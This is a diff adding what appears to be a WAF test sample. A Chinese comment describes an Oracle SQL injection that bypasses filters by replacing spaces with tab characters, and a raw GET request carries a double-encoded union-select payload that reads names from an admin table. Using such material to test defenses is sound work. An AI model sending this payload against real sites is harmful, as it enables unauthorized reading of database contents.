@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_普通注入(空白符替换绕过)-06506321
+# 攻击者基于union查询使用空白符替换进行绕过，将"union%09select-1,%09name%09from%09admin"语句注入到 SQL 查询参数中，查询表中所有数据。
+GET /?id=1%2509or%25091%2509like%25091%2509union%2509select-1%2C%2509name%2509from%2509admin&bid=hd_tag_m8mv2404 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2404
+RM-PRO-Token: 390d6e99406ffff1e84d597885706284
+RM-PRO-Time: 1742808356077
+User-Agent: curl/7.83.1
+
